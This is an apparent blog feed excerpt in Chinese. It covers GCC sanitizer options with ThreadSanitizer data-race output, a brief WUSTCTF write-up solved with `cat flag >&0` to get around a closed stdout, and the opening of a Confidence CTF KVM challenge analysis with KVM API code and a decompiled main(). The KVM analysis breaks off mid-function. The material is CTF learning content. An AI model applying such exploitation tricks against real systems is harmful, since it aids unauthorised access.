Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">5117</span>==ABORTING</span><br></pre></td></tr></table></figure><p>关于相关漏洞检测还有use after return、use after scope、initializations order bugs、memory leaks，可自行举例测试。</p><p>除了<strong>-fsanitize=address</strong>外，还有一些其他的编译选项检测功能。</p><h3 id="fsanitize-kernel-address"><a href="#fsanitize-kernel-address" class="headerlink" title="-fsanitize=kernel-address"></a>-fsanitize=kernel-address</h3><p>内核态内存错误检测器</p><h3 id="fsanitize-thread"><a href="#fsanitize-thread" class="headerlink" title="-fsanitize=thread"></a>-fsanitize=thread</h3><p>使能ThreadSanitizer，快速数据竞争检测。</p><p>这里使用的应该是TSAN，不是ASAN。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Global;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Thread1</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Global = <span class="number">42</span>;<span class="comment">//访问内存资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Thread2</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Global = <span class="number">43</span>;<span class="comment">//访问内存资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> t[<span class="number">2</span>];</span><br><span class="line">    pthread_create(&amp;t[<span class="number">0</span>], <span class="literal">NULL</span>, Thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;t[<span class="number">1</span>], <span class="literal">NULL</span>, Thread2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o data_race -fsanitize=thread -ltsan -fuse-ld=gold data_race.c</code><br><code>./data_race</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">==================</span><br><span class="line">WARNING: ThreadSanitizer: <span class="function">data <span class="title">race</span> (<span class="params">pid=<span class="number">5172</span></span>)</span></span><br><span class="line"><span class="function">  Write of size 4 at 0x000000402064 <span class="keyword">by</span> thread T2:    <span class="comment">//线程T2访问了冲突的资源</span></span></span><br><span class="line"><span class="function">    #0 Thread2 /home/c7/桌面/asan/data_race.c:13 (<span class="params">data_race+<span class="number">0x000000400959</span></span>) <span class="comment">//访问内存资源</span></span></span><br><span class="line"><span class="function">    #1 &lt;<span class="literal">null</span>&gt; &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x0000000230d9</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Previous write of size 4 at 0x000000402064 <span class="keyword">by</span> thread T1:   <span class="comment">//线程T1访问了冲突的资源</span></span></span><br><span class="line"><span class="function">    #0 Thread1 /home/c7/桌面/asan/data_race.c:7 (<span class="params">data_race+<span class="number">0x000000400918</span></span>)  <span class="comment">//访问冲突资源</span></span></span><br><span class="line"><span class="function">    #1 &lt;<span class="literal">null</span>&gt; &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x0000000230d9</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Location <span class="keyword">is</span> <span class="keyword">global</span> &#x27;Global&#x27; of size 4 at 0<span class="title">x000000402064</span> (<span class="params">data_race+<span class="number">0x000000402064</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Thread <span class="title">T2</span> (<span class="params">tid=<span class="number">5175</span>, running</span>) created <span class="keyword">by</span> main thread at:    <span class="comment">//创建T2的调用栈</span></span></span><br><span class="line"><span class="function">    #0 <span class="title">pthread_create</span> &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x000000027577</span></span>)</span></span><br><span class="line"><span class="function">    #1 main /home/c7/桌面/asan/data_race.c:21 (<span class="params">data_race+<span class="number">0x0000004009d5</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Thread <span class="title">T1</span> (<span class="params">tid=<span class="number">5174</span>, finished</span>) created <span class="keyword">by</span> main thread at: <span class="comment">//创建T1的调用栈</span></span></span><br><span class="line"><span class="function">    #0 <span class="title">pthread_create</span> &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x000000027577</span></span>)</span></span><br><span class="line"><span class="function">    #1 main /home/c7/桌面/asan/data_race.c:20 (<span class="params">data_race+<span class="number">0x0000004009b6</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">SUMMARY: ThreadSanitizer: data race /home/c7/桌面/asan/data_race.c:13 Thread2</span></span><br><span class="line"><span class="function"></span>==================</span><br><span class="line"></span><br><span class="line">ThreadSanitizer: reported <span class="number">1</span> warnings</span><br></pre></td></tr></table></figure><h3 id="fsanitize-leak"><a href="#fsanitize-leak" class="headerlink" title="-fsanitize=leak"></a>-fsanitize=leak</h3><p>使能LeakSanitizer，内存泄露检测，作用于链接阶段。只有当-fsanitize=address和-fsanitize=thread均不使能时才有效。<strong>没有-fsanitize=address功能全面，只做内存泄露检测，但是速度比-fsanitize=address要快</strong>。</p><p>内存泄露检查-fsanitize=leak只有在GCC版本≥4.9时才有效。</p><h3 id="fsanitize-undefined"><a href="#fsanitize-undefined" class="headerlink" title="-fsanitize=undefined"></a>-fsanitize=undefined</h3><p>运行时快速未定义行为检测器。包括如下6~22共17个子选项。</p><h3 id="fsanitize-shift"><a href="#fsanitize-shift" class="headerlink" title="-fsanitize=shift"></a>-fsanitize=shift</h3><p>移位操作符的移位大小超过了位宽或者小于零，或者左边是负值。 对于有符号数移位, 检查C中的有符号溢出，在C++中检查无符号溢出。</p><h3 id="fsanitize-integer-divide-by-zero"><a href="#fsanitize-integer-divide-by-zero" class="headerlink" title="-fsanitize=integer-divide-by-zero"></a>-fsanitize=integer-divide-by-zero</h3><p>整数除零。</p><h3 id="fsanitize-unreachable"><a href="#fsanitize-unreachable" class="headerlink" title="-fsanitize=unreachable"></a>-fsanitize=unreachable</h3><p>如果控制流到达 __builtin_unreachable。</p><h3 id="fsanitize-vla-bound"><a href="#fsanitize-vla-bound" class="headerlink" title="-fsanitize=vla-bound"></a>-fsanitize=vla-bound</h3><p>可变长数组边界值非正。</p><h3 id="fsanitize-null"><a href="#fsanitize-null" class="headerlink" title="-fsanitize=null"></a>-fsanitize=null</h3><p>使用一个空指针或者创建一个空引用。</p><h3 id="fsanitize-return"><a href="#fsanitize-return" class="headerlink" title="-fsanitize=return"></a>-fsanitize=return</h3><p><strong>仅C++有效</strong>，对函数返回值进行检查，定义了返回值为非空的函数如果未返回有效值将会报错。</p><h3 id="fsanitize-signed-integer-overflow"><a href="#fsanitize-signed-integer-overflow" class="headerlink" title="-fsanitize=signed-integer-overflow"></a>-fsanitize=signed-integer-overflow</h3><p>有符号整数溢出, 包含所有通过 -ftrapv 添加的检查, 并且检查有符号除法溢出 (INT_MIN / -1)。</p><h3 id="fsanitize-bounds"><a href="#fsanitize-bounds" class="headerlink" title="-fsanitize=bounds"></a>-fsanitize=bounds</h3><p>数组索引越界, 以防数组边界可以静态检测。</p><h3 id="fsanitize-alignment"><a href="#fsanitize-alignment" class="headerlink" title="-fsanitize=alignment"></a>-fsanitize=alignment</h3><p>使用一个未对齐的指针或者引用。</p><h3 id="fsanitize-object-size"><a href="#fsanitize-object-size" class="headerlink" title="-fsanitize=object-size"></a>-fsanitize=object-size</h3><p>尝试使用优化器可以探测到不属于访问对象的字节。 对象的大小使用 __builtin_object_size 检测, 并且结果可能会探测到多个问题在高层次的优化。</p><h3 id="fsanitize-float-divide-by-zero"><a href="#fsanitize-float-divide-by-zero" class="headerlink" title="-fsanitize=float-divide-by-zero"></a>-fsanitize=float-divide-by-zero</h3><p>浮点除零。不能被-fsanitize=undefined使能。</p><h3 id="fsanitize-float-cast-overflow"><a href="#fsanitize-float-cast-overflow" class="headerlink" title="-fsanitize=float-cast-overflow"></a>-fsanitize=float-cast-overflow</h3><p>浮点到整形转换的检查，不能被-fsanitize=undefined使能。</p><h3 id="fsanitize-nonnull-attribute"><a href="#fsanitize-nonnull-attribute" class="headerlink" title="-fsanitize=nonnull-attribute"></a>-fsanitize=nonnull-attribute</h3><p>对使用<strong>attribute</strong> nonnull限定参数非空的函数进行检查。</p><h3 id="fsanitize-returns-nonnull-attribute"><a href="#fsanitize-returns-nonnull-attribute" class="headerlink" title="-fsanitize=returns-nonnull-attribute"></a>-fsanitize=returns-nonnull-attribute</h3><p>对使用<strong>attribute</strong>((returns_nonnull))限定返回为非空指针的函数进行检测。</p><h3 id="fsanitize-bool"><a href="#fsanitize-bool" class="headerlink" title="-fsanitize=bool"></a>-fsanitize=bool</h3><p>加载一个既不是真也不是假的bool值。</p><h3 id="fsanitize-enum"><a href="#fsanitize-enum" class="headerlink" title="-fsanitize=enum"></a>-fsanitize=enum</h3><p>加载一个枚举类型的值，但是值不在那个枚举类型范围内。</p><h3 id="fsanitize-vptr"><a href="#fsanitize-vptr" class="headerlink" title="-fsanitize=vptr"></a>-fsanitize=vptr</h3><p>使用一个vptr预示着具有错误动态类型的对象，或者它的生命长度还未开始或者已经结束。与 -fno-rtti 兼容。</p><h3 id="fno-sanitize-all"><a href="#fno-sanitize-all" class="headerlink" title="-fno-sanitize=all"></a>-fno-sanitize=all</h3><p>禁止之前所有的子选项，-fsanitize=all是不能使用的，因某些子选项是不兼容的。</p><h3 id="fasan-shadow-offset-number"><a href="#fasan-shadow-offset-number" class="headerlink" title="-fasan-shadow-offset=number"></a>-fasan-shadow-offset=number</h3><p>自定义AddressSanitizer检查中的shadow偏移。</p><h3 id="fsanitize-recover-opts"><a href="#fsanitize-recover-opts" class="headerlink" title="-fsanitize-recover[=opts]"></a>-fsanitize-recover[=opts]</h3><p>使用逗号分隔的列表控制错误恢复模式。如：-fsanitize-recover=undefined,float-cast-overflow,float-divide-by-zero</p><p>-fno-sanitize-recover等同于</p><p>-fno-sanitize-recover=undefined,float-cast-overflow,float-divide-by-zero。</p><h3 id="fsanitize-undefined-trap-on-error"><a href="#fsanitize-undefined-trap-on-error" class="headerlink" title="-fsanitize-undefined-trap-on-error"></a>-fsanitize-undefined-trap-on-error</h3><p>控制编译器用using __builtin_trap替代libubsan报告未定义行为。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://bbs.huaweicloud.com/blogs/100056">https://bbs.huaweicloud.com/blogs/100056</a></p><p><a href="https://blog.csdn.net/wads23456/article/details/104842189/?utm_medium=distribute.pc_relevant.none-task-blog-title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/wads23456/article/details/104842189/?utm_medium=distribute.pc_relevant.none-task-blog-title-1&amp;spm=1001.2101.3001.4242</a></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[WUSTCTF]closed</title>
      <link>https://billyotry.github.io/2021/01/22/[WUSTCTF]closed/</link>
      <guid>https://billyotry.github.io/2021/01/22/[WUSTCTF]closed/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;标准输出流全关了，需要将&lt;code&gt;stdout&lt;/code&gt;重定向到&lt;code&gt;stdin&lt;/code&gt;就行了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat flag &amp;gt;&amp;amp;0&lt;/code&gt; 或 &lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/p&gt;

        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>标准输出流全关了，需要将<code>stdout</code>重定向到<code>stdin</code>就行了。</p><p><code>cat flag &gt;&amp;0</code> 或 <code>exec 1&gt;&amp;0</code></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/[WUSTCTF]closed/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Confidence CTF]kvm</title>
      <link>https://billyotry.github.io/2021/01/22/[Confidence%20CTF]kvm/</link>
      <guid>https://billyotry.github.io/2021/01/22/[Confidence%20CTF]kvm/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Confidence2020-CTF-KVM&quot;&gt;&lt;a href=&quot;#Confidence2020-CTF-KVM&quot; class=&quot;headerlink&quot; title=&quot;Confidence2020 CTF KVM&quot;&gt;&lt;/a&gt;Confidence2020 CTF K
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>参考链接：<a href="https://lwn.net/Articles/658511/">https://lwn.net/Articles/658511/</a></p><h3 id="构建虚拟机"><a href="#构建虚拟机" class="headerlink" title="构建虚拟机"></a>构建虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure><p>我们需要对设备的读写访问来设置虚拟机，并且所有打开不是明确打算跨<code>exec</code>继承的，应使用 <code>O_CLOEXEC</code>。</p><h3 id="创建一个虚拟机"><a href="#创建一个虚拟机" class="headerlink" title="创建一个虚拟机"></a>创建一个虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>现在创建一个虚拟机，它代表与模拟出来的系统所有相关联的内容，包括内存，一或多个CPU。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">int ioctl(int fd, ind cmd, …)； </span><br></pre></td></tr></table></figure><p><strong>ioctl</strong> 是设备驱动程序中对设备I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。</p><ul><li><strong>fd</strong> 是用户程序打开设备时使用<strong>open函数返回的文件标示符</strong>。</li><li><strong>cmd</strong> 是用户程序对设备的控制命令。</li><li><strong>省略号</strong>是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。</li></ul><h3 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h3><p>现在虚拟机需要分配一些内存。<strong>分配的内存就相当于虚拟机的物理内存</strong>，为了提高性能，我们不想捕获所有对于内存的访问并且模拟的返回它对应的地址；相反的是，当虚拟CPU试图访问内存的时候，CPU的硬件虚拟化会首先对尝试通过设置的内存页表来满足对内存的访问，如果失败了（由于虚拟机访问的是”物理”地址，而内存没有映射到该地址），那么内核就会使用KVM API 来处理这个访问，例如通过模拟内存映射的I/O设备或者产生一个错误。</p><p>对于我们的例子，我们分配了单独的页来存放我们的代码，使用mmap()直接获得初始化为0的页面对齐的内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>我们需要复制我们的机器代码到这个分配的空间内：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure><p>然后告诉虚拟机它有足够大的4096个字节的内存：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> =</span> &#123;</span><br><span class="line">.slot = <span class="number">0</span>,</span><br><span class="line">.guest_phys_addr = <span class="number">0x1000</span>,</span><br><span class="line">.memory_size = <span class="number">0x1000</span>,</span><br><span class="line">.userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br></pre></td></tr></table></figure><ul><li><strong>slot</strong> 字段提供了一个整数索引，用于标识我们要移交给KVM的每个内存区域，再次使用相同的 slot 调用KVM_SET_USER_MEMORY_REGION将替换此映射，如果使用不同的 slot 就会创建一个新的单独的映射。</li><li><strong>guest_phys_addr</strong> 字段指定物理地址的基址。</li><li><strong>memory_size</strong> 字段指定我们要分配多大的内存。</li><li><strong>userspace_addr</strong> 字段指向我们使用mmap() 分配的后备内存，需要注意的是这个值总是64位的即使在32位平台上也是64位的，还有一点就是这里要求 mem 是页对齐的，这也就是为什么上面mmap的时候要分配一个页对齐的页。 </li></ul><h3 id="创建虚拟CPU"><a href="#创建虚拟CPU" class="headerlink" title="创建虚拟CPU"></a>创建虚拟CPU</h3><p>现在我们有一个VM并且VM中包含我们的代码，并且代码正等待运行，所以我们需要一个虚拟CPU来运行代码，KVM的虚拟CPU代表模拟CPU的状态，包括进程寄存器和其他的执行状态。</p><p>同样，KVM以文件描述符的形式为我们提供该VCPU的句柄：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>第三个参数 0 代表虚拟CPU的索引，具有多个CPU的VM将在此处分配一系列标识符，从0到系统特定的限制（可通过使用KVM_CHECK_EXTENSION检查KVM_CAP_MAX_VCPUS功能来获得）</p><h3 id="为CPU分配内存"><a href="#为CPU分配内存" class="headerlink" title="为CPU分配内存"></a>为CPU分配内存</h3><p>每个CPU都有一个关联的<code>struct kvm_run</code>的数据结构，用于CPU在内核和用户空间的信息交换，特别是，无论何时硬件虚拟化停止了，例如模拟的一些虚拟硬件，<code>kvm_run</code>结构将会包含为什么停止的信息，我们使用mmap映射它到用户内存空间内，但是首先我们需要知道分配多少内存，KVM通过KVM_GET_VCPU_MMAP_SIZE ioctl来告诉我们</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>需要注意的是分配的内存通常都是大于<code>kvm_run</code>的大小的，因为内核还将使用该空间来存储<code>kvm_run</code>可能指向的其他瞬时结构。</p><p>现在我们已经知道了应该分配的size，我们可以使用mmap来映射这个<code>kvm_run</code>结构了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="设置标准和特殊寄存器"><a href="#设置标准和特殊寄存器" class="headerlink" title="设置标准和特殊寄存器"></a>设置标准和特殊寄存器</h3><p>VCPU也包含进程的寄存器状态，分为两组寄存器，一组是标准寄存器，一组是特殊寄存器。这两种寄存器对印这两个特定体系的数据结构 <code>struct kvm_regs</code> 和 <code>struct kvm_sregs</code>。在x86上，标准寄存器包括通用寄存器以及指令指针和标志。”特殊”寄存器主要包括段寄存器和控制寄存器。</p><p>在我们开始运行我们的代码之前，我们应该要先初始化这些寄存器，对于特殊寄存器我们只需要更改 cs 段寄存器，cs 段寄存器的默认状态（以及初始指令指针）指向复位向量，位于内存顶部下方16个字节处，但我们希望 cs 改为指向0，<code>kvm_sregs</code>中的每个段都包含一个完整的段描述符；我们不需要更改各种标志或限制，但是我们将 cs 的 base 和 selector 归零，这两个字段共同确定段指向的内存地址。为了避免更改任何其他初始”特殊”寄存器状态，我们将其读出，更改 cs 并将其写回：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br></pre></td></tr></table></figure><p>对于标准寄存器，除了初始指令指针（指向代码0x1000，相对于 cs 指向0），加数（2和2）以及标志的初始状态（由x86架构指定为0x2；如果未设置此选项，则启动VM将会失败）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">.rip = <span class="number">0x1000</span>,</span><br><span class="line">.rax = <span class="number">2</span>,</span><br><span class="line">.rbx = <span class="number">2</span>,</span><br><span class="line">.rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br></pre></td></tr></table></figure><h3 id="开始运行"><a href="#开始运行" class="headerlink" title="开始运行"></a>开始运行</h3><p>现在我们VM和VCPU以及初始化好了，内存映射也初始化好了，寄存器也都初始化好了，现在可以使用<code>kvm_run ioctl()</code>运行代码了，每当虚拟化停止时，这将成功返回，例如让我们模拟硬件，因此我们将其循环运行。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</span><br><span class="line"><span class="comment">/* Handle exit */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，<code>KVM_RUN</code>在当前进程的上下文运行VM，并且知道仿真停止后才返回。要运行多个VM，用户空间进程必须产生多个线程，并为不同线程中的不同虚拟CPU调用<code>KVM_RUN</code>。</p><h3 id="处理退出"><a href="#处理退出" class="headerlink" title="处理退出"></a>处理退出</h3><p>我们通过检测<code>run-&gt;exit_reason</code>来看为什么退出，<code>run-&gt;exit_reason</code>包含了数十个退出原因中的一个，对应与<code>kvm_run</code>中联合的不同分支。</p><p>对于这个简单的VM，我们只处理其中的几个，并将其他的<code>exit_reason</code>视为错误。</p><p>我们将暂停视为以及结束的标志</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>为了让虚拟代码输出结果，我们在I/O端口0x3f8上模拟了一个串行端口。 run-&gt; io中的字段指示方向（输入或输出），大小（1、2或4），端口和值的数量。为了传递实际数据，内核使用在kvm_run结构之后映射的缓冲区，并且run-&gt; io.data_offset提供从该映射开始的偏移量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line"><span class="keyword">if</span> (run-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp;</span><br><span class="line">run-&gt;io.size == <span class="number">1</span> &amp;&amp;</span><br><span class="line">run-&gt;io.port == <span class="number">0x3f8</span> &amp;&amp;</span><br><span class="line">run-&gt;io.count == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">putchar</span>(*(((<span class="keyword">char</span> *)run) + run-&gt;io.data_offset));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">errx(<span class="number">1</span>, <span class="string">&quot;unhandled KVM_EXIT_IO&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>为了简化调试设置和运行VM的过程，我们处理了一些常见的错误。特别是，KVM_EXIT_FAIL_ENTRY在更改VM的初始条件时经常显示；这表明底层硬件虚拟化机制（在这种情况下为VT）无法启动VM，因为初始条件不符合其要求。 （在其他原因中，如果标志寄存器未设置0x2位，或者段或任务切换寄存器的初始值未通过各种设置条件，则将发生此错误。）hardware_entry_failure_reason实际上并不能区分很多情况，因此，此类错误通常需要仔细阅读硬件文档。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_FAIL_ENTRY:</span><br><span class="line">errx(<span class="number">1</span>, <span class="string">&quot;KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx&quot;</span>,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)run-&gt;fail_entry.hardware_entry_failure_reason);</span><br></pre></td></tr></table></figure><p>当我们将所有这些放到示例代码中，对其进行构建并运行时，我们得到以下信息：</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ ./kvmtest</span><br><span class="line"><span class="number">4</span></span><br><span class="line">KVM_EXIT_HLT</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_user_memory; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_vcpu; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_regs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_get_sregs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_sregs; <span class="comment">// eax</span></span><br><span class="line">  __u32 exit_reason; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> code_size; <span class="comment">// [rsp+Ch] [rbp-8274h]</span></span><br><span class="line">  <span class="keyword">int</span> kvmfd; <span class="comment">// [rsp+10h] [rbp-8270h]</span></span><br><span class="line">  <span class="keyword">int</span> vmfd; <span class="comment">// [rsp+14h] [rbp-826Ch]</span></span><br><span class="line">  <span class="keyword">int</span> vcpu; <span class="comment">// [rsp+18h] [rbp-8268h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-8264h]</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_guest_mem; <span class="comment">// [rsp+20h] [rbp-8260h]</span></span><br><span class="line">  <span class="keyword">size_t</span> vcpu_mmap_size; <span class="comment">// [rsp+28h] [rbp-8258h]</span></span><br><span class="line">  kvm_run *run_mem; <span class="comment">// [rsp+30h] [rbp-8250h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+38h] [rbp-8248h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+40h] [rbp-8240h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+48h] [rbp-8238h]</span></span><br><span class="line">  __u64 v23; <span class="comment">// [rsp+50h] [rbp-8230h]</span></span><br><span class="line">  __u64 v24; <span class="comment">// [rsp+58h] [rbp-8228h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+60h] [rbp-8220h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+68h] [rbp-8218h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+70h] [rbp-8210h]</span></span><br><span class="line">  kvm_userspace_memory_region region; <span class="comment">// [rsp+80h] [rbp-8200h]</span></span><br><span class="line">  kvm_regs guest_regs; <span class="comment">// [rsp+A0h] [rbp-81E0h]</span></span><br><span class="line">  kvm_sregs 